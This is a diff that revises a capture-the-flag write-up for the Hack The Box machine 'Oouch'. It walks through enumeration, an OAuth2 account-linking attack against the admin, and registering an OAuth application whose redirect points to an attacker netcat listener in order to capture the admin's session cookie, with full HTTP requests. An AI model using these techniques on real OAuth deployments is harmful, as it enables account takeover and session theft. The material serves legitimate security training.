@@ -10,7 +10,7 @@
 
 ### Nmap scan
 
-First off, I started my enumeration with an nmap scan of `10.10.10.177`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all TCP ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, `-oN <name>` saves the output with a filename of `<name>`.
+First off, I started my enumeration with an nmap scan of `10.10.10.177`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all TCP ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN <name>` which saves the output with a filename of `<name>`.
 
 ```bash
 zweilos@kalimaa:~/htb/oouch$ nmap -p- -sC -sV -oA oouch 10.10.10.177
@@ -85,7 +85,9 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 2390.62 seconds
 ```
 
-Next, see if you can connect anonymously to ftp...and we can!
+#### Anonymous FTP
+
+When doing my initial reconnaissance, I prefer to test for anonymous access to remote access and file sharing services such as ftp, telnet, and SMB before tacking more time and resource intensive services.  In this case since port 21 was open, my first step was to login to FTP as `anonymous`.  
 
 ```http
 zweilos@kalimaa:~/htb/oouch$ ftp 10.10.10.177
@@ -119,7 +121,7 @@ ftp> quit
 221 Goodbye.
 ```
 
-Only one file `project.txt` was on the server, and we couldn't navigate anywhere else.
+There was only one file, `project.txt` on the server, and I couldn't navigate anywhere else.
 
 ```text
 zweilos@kalimaa:~/htb/oouch$ cat project.txt
@@ -127,24 +129,32 @@ Flask -> Consumer
 Django -> Authorization Server
 ```
 
-Looks like `Flask` and `Django` are the two types of frameworks for the different services on a website. Time to check the next ports. SSH did not allow me to connect without a private key _\(note that there is no password though\)_.
+The contents of the file revealed that `Flask` and `Django` were the two types of frameworks for the different services on some project. Doing a bit of quick reading revealed that [Flask](https://flask.palletsprojects.com/) and [Django](https://www.djangoproject.com/) are python-based frameworks for building web apps.
+
+Next I checked SSH, but it did not allow me to connect without a private key _\(I did note that there is no password required though\)_.
 
 ```text
 zweilos@kalimaa:~/htb/oouch$ ssh 10.10.10.177
 zweilos@10.10.10.177: Permission denied (publickey).
 ```
 
-Navigating to `http://10.10.10.177:5000` led to a login page.
+### Website on port 5000
+
+The next open port on my list was 5000.  This is a non-standard port and could have been anything, but Nmap reported that there was an Nginx server hosting an HTTP server there, so I fired up my browser to check it out.  Navigating to `http://10.10.10.177:5000` led to a pretty bare-bones login page.
 
 ![](../../.gitbook/assets/screenshot_2020-06-09_15-36-13.png)
 
 ## Initial Foothold
 
-From here I went to the `Register` page, created an account, logged in, and started looking around the internal site. There was not much to do, though there was an interesting "send a message to the administrator" type input box on the `/contact` page.
+First, I tested a few common default logins such as 'admin:admin' but that didn't get me anywhere.  From there I went to the `Register` page, created an account, logged in, and started looking around the site. 
+
+![](../../.gitbook/assets/oouch2.png)
+
+There was not much to do on most of the internal pages, though there was an interesting "send a message to the administrator" type input box on the `/contact` page.
 
 ![](../../.gitbook/assets/screenshot_2020-06-09_15-41-13.png)
 
-Attempting to check for XSS on the contact page using `javascript:alert(document.cookie)` resulted in: `"Hacking Attempt Detected"` and a one minute IP ban \(see screenshot below\). Sending the word 'javascript' was fine...but sending just the word 'alert' also triggered this message...There must be some sort of filter, WAF, or IPS.
+Attempting to check for XSS on the contact page using `javascript:alert(document.cookie)` resulted in: `"Hacking Attempt Detected"` and a one minute IP ban \(see screenshot below\). Sending the word 'JavaScript' was fine...but sending just the word 'alert' also triggered this message...I decided there must be some sort of filter, WAF, or IPS.
 
 ![](../../.gitbook/assets/screenshot_2020-06-09_16-04-27.png)
 
@@ -155,7 +165,9 @@ Next I used Gobuster to search for more accessible directories and found an `/oa
 > * In order to connect your account:`http://consumer.oouch.htb:5000/oauth/connect`
 > * Once your account is connected, login here:`http://consumer.oouch.htb:5000/oauth/login`
 
-After clicking the `/connect` link, I was redirected to `http://authorization.oouch.htb:8000/login/`. I added the newly enumerated domains to my `/etc/hosts` file so I could proceed.
+### Website on port 8000
+
+After clicking the `/connect` link, I was redirected to `http://authorization.oouch.htb:8000/login/`. I added each of the newly found domains to my `/etc/hosts` file so I could proceed.
 
 ```text
 10.10.10.177    oouch.htb
@@ -165,19 +177,29 @@ After clicking the `/connect` link, I was redirected to `http://authorization.oo
 
 I didn't have any credentials that worked for the authorization site, so I began poking around to see if there was a way to register. The register link was at the root at `http://authorization.oouch.htb:8000/`.
 
+### The Oauth2 server
+
 ![](../../.gitbook/assets/screenshot_2020-06-10_11-16-23.png)
 
-I used these sites to do some research on the Oauth 2 protocol:
+I found these sites to be useful while doing research on the Oauth2 protocol:
 
-> [https://dhavalkapil.com/blogs/Attacking-the-OAuth-Protocol/](https://dhavalkapil.com/blogs/Attacking-the-OAuth-Protocol/) [https://aaronparecki.com/oauth-2-simplified/](https://aaronparecki.com/oauth-2-simplified/) [RFC 6749: The OAuth 2.0 Authorization Framework](https://tools.ietf.org/html/rfc6749)
+> * [https://dhavalkapil.com/blogs/Attacking-the-OAuth-Protocol/](https://dhavalkapil.com/blogs/Attacking-the-OAuth-Protocol/)
+> * [https://aaronparecki.com/oauth-2-simplified/](https://aaronparecki.com/oauth-2-simplified/)
+> * [RFC 6749: The OAuth 2.0 Authorization Framework](https://tools.ietf.org/html/rfc6749)
 
 After creating an account and logging in, I was greeted with two API links `/oauth/get_user` and `/oauth/token`.
 
 ![](../../.gitbook/assets/screenshot_2020-06-13_07-09-34.png)
 
-They didn't seem to do anything yet \(according to my research I needed a higher privilege authorization token\), so I went back to original account on `http://consumer.oouch.htb:5000/oauth` to use the `/connect` link to authorize my two accounts to connect. Using Burp, I allowed each of the requests until got to the button to authorize the connect:
+The two links didn't seem to do anything yet \(according to my research I needed a higher privilege authorization token\).  I needed a way to get this token from a higher privilege user, and the only thing I could think of that I had found related to a site admin was the `/contact` page on the port 5000 site. Since the `/oauth` page had a method labeled "connect", I figured the path forward must involve using oauth2 to link my account to the admin account.  
 
-I then clicked the button, allowed the POST to the server in Burp,
+After a lot of trial and error and lots of reading of the Oath2 documentation I figured out how to pause the authorization process to connect two accounts in the middle just before the final step.  This makes it so the account is in a state where you have an authorization to connect token that is supposed to be sent to the authorized service to connect to.  Since this token is sent in the URL, it is trivial to send it as a link to other people in order to link my account to one of my choice.  
+
+In order to exploit this, I first went back to original account on `http://consumer.oouch.htb:5000/` to use the `/connect` link on the `/oauth` page to authorize my two accounts to connect \(the one on the consumer page on port 5000 and the Oauth2 internal account on port 8000\). 
+
+![](../../.gitbook/assets/oouch8.png)
+
+Using Burp to intercept all browser requests, I allowed each of the requests to pass until got to the button to authorize the connect.  I then clicked the button, allowed the POST to the server in Burp,
 
 ```http
 POST /oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&scope=read HTTP/1.1
@@ -197,7 +219,7 @@ DNT: 1
 csrfmiddlewaretoken=ZNU3fziGduXycKscNjozBj8EY2TLhuRYei3lxLEWB80XoWZSBdn8SXVIb4zZb7G0&redirect_uri=http%3A%2F%2Fconsumer.oouch.htb%3A5000%2Foauth%2Fconnect%2Ftoken&scope=read&client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&state=&response_type=code&allow=Authorize
 ```
 
-...then intercepted the GET request with the authorization link, and dropped the request in Burp so it wouldn't authorize the two accounts to be linked. I needed to start the authorization process in order to get a link that I could use to get any other account to connect to mine.
+...then intercepted the GET request that contained the authorization link, and dropped the request in Burp so it wouldn't authorize the two accounts to be linked. I needed to start the authorization process in order to get that link  I could use to get any other account to connect to mine.
 
 ```http
 GET /oauth/connect/token?code=OcnuHPMmp4x0UcGjI9Tp87tnvxdfI6 HTTP/1.1
@@ -215,21 +237,27 @@ DNT: 1
 
 ## Road to User
 
+### Server-side Request Forgery \(SSRF\)
+
 Next, I needed to get the admin to link his account to mine in order to escalate my privileges. I went back to the `http://consumer.oouch.htb:5000/contact` page, and sent the admin the link with my authorization token request link, which was already activated through the POST message earlier. All I needed was for the admin to click the link to connect our accounts. This was an example of an attack called [Server-side Request Forgery \(SSRF\)](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery).
 
-The link I sent: `http://consumer.oouch.htb:5000/oauth/connect/token?code=4GCuHQ0LTjKkezQmz2jlolgHxfLXbc` _\(copied from the url bar after Burp dropped the `GET` above.\)_ I then used the link `http://consumer.oouch.htb:5000/oauth/login` from the `/oauth` page to authorize the account connection.
+![](../../.gitbook/assets/oouch13.png)
+
+I sent the following link to the admin, and hoped that there was some way that they would click it: `http://consumer.oouch.htb:5000/oauth/connect/token?code=4GCuHQ0LTjKkezQmz2jlolgHxfLXbc` _\(copied from the url bar after Burp dropped the `GET` earlier\)._  
+
+![](../../.gitbook/assets/oouch10.png)
+
+After getting a message thanking me for my feedback to the admin, I used the link `http://consumer.oouch.htb:5000/oauth/login` from the `/oauth` page to authorize the account connection.
 
 > _Note: You have to log in fast otherwise the token expires!_
 
-The `/profile` page now showed:
-
 ![](../../.gitbook/assets/screenshot_2020-06-10_15-42-54.png)
 
-> Username: qtc Email: qtc@nonexistend.nonono Connected-Accounts: kainoauth.
+The `/profile` page now showed was logged in as the user `qtc` with my oauth2 account linked to it.
 
 ### Finding the developer creds
 
-And on the `/documents` page we now had the following:
+I noticed on the `/documents` page I now had the following items listed:
 
 > Hello qtc! You have currently following documents stored:
 >
@@ -237,16 +265,29 @@ And on the `/documents` page we now had the following:
 > * o\_auth\_notes.txt    /api/get\_user -&gt; user data. oauth/authorize -&gt; Now also supports GET method.
 > * todo.txt            Chris mentioned all users could obtain my ssh key. Must be a joke...
 
-We now have some developer creds...but where to use them? I turned to gobuster once again to search for more directories, and found `/oauth/applications/register/` which gives us a basic authentication login to use the develop creds above...and now we can register an application!?
+I now had some credentials for a `develop` user but I wasn't sure where to use them. 
 
-![Screenshot\_2020-06-11\_02-17-02.png](https://github.com/zweilosec/htb-writeups/tree/6febf8c8db1b53fd2442636c0874aac26d8a2069/machines/:/bd448d933cc9493fb8b87d68119036f8) _I forgot the port on my redirect URL the first time. Luckily there is an edit button!_
+I turned to gobuster once again to search for more directories, and found `/oauth/applications/register/` which gave me an HTTP basic authentication login prompt where I used the develop creds from the `/documents` page.  
 
-> Here is some programming information about registering Django apps at [https://django-registration.readthedocs.io/en/3.1/quickstart.html](https://django-registration.readthedocs.io/en/3.1/quickstart.html).  
-> I also did some more research at [https://flask-oauthlib.readthedocs.io/en/latest/oauth2.html](https://flask-oauthlib.readthedocs.io/en/latest/oauth2.html) on how to register a new application.
+![](../../.gitbook/assets/oouch17.png)
 
-You can apparently set the authorization link to redirect whereever you want. By setting the redirect url to be my local machine, I could then listen for a connection with nc.
+After logging in I was given a page where I could register a new application.  I went back and did some more research on registering web applications and found information for both Django and Flask.  
 
-My registration request looked like this in Burp:
+> [https://django-registration.readthedocs.io/en/3.1/quickstart.html](https://django-registration.readthedocs.io/en/3.1/quickstart.html) - Programming information about registering Django apps
+
+> [https://flask-oauthlib.readthedocs.io/en/latest/oauth2.html](https://flask-oauthlib.readthedocs.io/en/latest/oauth2.html) - how to register a new Flask application
+
+You can apparently set the authorization link to redirect wherever you want. By setting the redirect URL to be my local machine, I could then listen for a connection with netcat and see if it returned any interesting information.
+
+_I forgot the port on my redirect URL while filling out the request the first time. Luckily there was an edit button!_
+
+![](../../.gitbook/assets/screenshot_2020-06-11_02-20-00.png)
+
+> _Side note: After creating app and clicking "back" it prompts for basic authentication with the text “Oouch Admin Only” at URL `http://authorization.oouch.htb:8000/oauth/applications/`. The `develop` creds did not work here._
+
+![](../../.gitbook/assets/oouch20.png)
+
+My web app registration request looked like this in Burp:
 
 ```http
 POST /oauth/applications/register/ HTTP/1.1
@@ -267,6 +308,8 @@ DNT: 1
 csrfmiddlewaretoken=8saMcdN6jW2HIJjcK33GCJ7TeAXljGnDvZbLYVRNgNzPSGJ1xWjjhYWRalMvov1A&name=kaio&client_id=fN0PGweG94VEL6MzopplC1VASOetEWsVy3NW29ak&initial-client_id=fN0PGweG94VEL6MzopplC1VASOetEWsVy3NW29ak&client_secret=sPtIDd40zXgsmk8QLZ6vqb0AfCsYAOXQE6XPF485RusVdMfUdqz5EZjRTurBLMRnn1LN5ACYNxarbiASALSMqAOhKIr3bvGzI5QDV5Pg2QAGmw83OyHJBbyDfidZDOti&initial-client_secret=sPtIDd40zXgsmk8QLZ6vqb0AfCsYAOXQE6XPF485RusVdMfUdqz5EZjRTurBLMRnn1LN5ACYNxarbiASALSMqAOhKIr3bvGzI5QDV5Pg2QAGmw83OyHJBbyDfidZDOti&client_type=public&authorization_grant_type=authorization-code&redirect_uris=http%3A%2F%2F10.10.14.253%3A1234
 ```
 
+After allowing the POST request with my credentials I was redirected to a GET request to the register page.
+
 ```http
 GET /accounts/login/?next=/oauth/applications/register/ HTTP/1.1
 Host: authorization.oouch.htb:8000
@@ -281,9 +324,7 @@ Upgrade-Insecure-Requests: 1
 DNT: 1
 ```
 
-> _Side note: After creating app and clicking "back" it prompts for basic authentication with the text “Oouch Admin Only” at url `http://authorization.oouch.htb:8000/oauth/applications/`. The `develop` creds did not work here._
-
-I then sent an authorize request to the server to connect to the app I 'created', which should redirect to my nc listener:
+I then sent an authorize request to the server to connect to the app I 'created', which I hoped would redirect to my netcat listener:
 
 ```http
 GET /oauth/authorize/?client_id=aIX617P5jWh41UJ1Li3xntUi3W1xVOZDPb0YupTG&redirect_uris=http%3A%2F%2F10.10.14.253%3A1234&grant_type=authorization-code&client_secret=GaUjTTAVrdAJPQHlp3B5NwpR0KvBSSvM6cIopY4uYmZ5N77toqYTidg5CMsW0CMpaWRuBP2YmjNcM9fZD0cJbEIqPyJrWn6Y8RcRD8E2w8C9MuZpjiDhvkRVr9Du97DS HTTP/1.1
@@ -298,7 +339,7 @@ Upgrade-Insecure-Requests: 1
 DNT: 1
 ```
 
-Got a connection from nc!
+I got a connection on my listener!
 
 ```bash
 zweilos@kalimaa:~/htb/oouch$ nc -lvnp 1234 > djangoapp                                                 
@@ -306,7 +347,7 @@ listening on [any] 1234 ...
 connect to [10.10.14.253] from (UNKNOWN) [10.10.14.253] 53300
 ```
 
-The connection only sent this message, but it was enough to see that it worked how I wanted.
+The connection only sent this error message, but it was enough to see that it worked how I wanted and gave me a clue as to what I needed to send to get a proper response.
 
 ```http
 GET /?error=invalid_request&error_description=Missing+response_type+parameter. HTTP/1.1
@@ -322,7 +363,9 @@ Host: 10.10.14.253:1234
 
 After seeing that I could get a connection from the server, I once again tried sending my request in a link to the admin on the `http://consumer.oouch.htb:5000/contact` page to see if we could use SSRF again to get any further info:
 
-`http://authorization.oouch.htb:8000/oauth/authorize/?client_id=aIX617P5jWh41UJ1Li3xntUi3W1xVOZDPb0YupTG&redirect_uris=http%3A%2F%2F10.10.14.253%3A1234&grant_type=authorization-code&client_secret=GaUjTTAVrdAJPQHlp3B5NwpR0KvBSSvM6cIopY4uYmZ5N77toqYTidg5CMsW0CMpaWRuBP2YmjNcM9fZD0cJbEIqPyJrWn6Y8RcRD8E2w8C9MuZpjiDhvkRVr9Du97DS`.
+```bash
+http://authorization.oouch.htb:8000/oauth/authorize/?client_id=aIX617P5jWh41UJ1Li3xntUi3W1xVOZDPb0YupTG&redirect_uris=http%3A%2F%2F10.10.14.253%3A1234&grant_type=authorization-code&client_secret=GaUjTTAVrdAJPQHlp3B5NwpR0KvBSSvM6cIopY4uYmZ5N77toqYTidg5CMsW0CMpaWRuBP2YmjNcM9fZD0cJbEIqPyJrWn6Y8RcRD8E2w8C9MuZpjiDhvkRVr9Du97DS
+```
 
 And I got a reply!
 
@@ -336,13 +379,13 @@ Connection: keep-alive
 Cookie: sessionid=34w2oj9hyjofej6d4cwr9dykbm5dl9ex;
 ```
 
-I now had a session cookie to log into `http://authorization.oouch.htb:8000/` as `qtc` _\(I first tried it on `http://consumer.oouch.htb:5000`, but it didn't do anything\)_.
+I now had a session cookie from the admin.  Since I was already logged in as `qtc` on the consumer portal, I used this cookie to see if I could to log into `http://authorization.oouch.htb:8000/` as `qtc` 
 
 ![](../../.gitbook/assets/screenshot_2020-06-11_02-51-40.png)
 
-Now that I had another account, it was time to try to get an authorization token to access the APIs `/oauth/token` and `/oauth/get_user` I saw earlier.
+It worked! Now that I had another higher privilege account, I decided it was time to try to get an authorization token to access the APIs `/oauth/token` and `/oauth/get_user` I saw earlier.
 
-Next I did more oauth 2 research, in particular on authenticating to APIs:
+Next I did some more oauth2 research, in particular on authenticating to APIs:
 
 > * [https://www.toptal.com/django/integrate-oauth-2-into-django-drf-back-end](https://www.toptal.com/django/integrate-oauth-2-into-django-drf-back-end)
 > * [https://docs.oracle.com/en/cloud/saas/marketing/eloqua-develop/Developers/GettingStarted/Authentication/authenticate-using-oauth.htm](https://docs.oracle.com/en/cloud/saas/marketing/eloqua-develop/Developers/GettingStarted/Authentication/authenticate-using-oauth.htm)
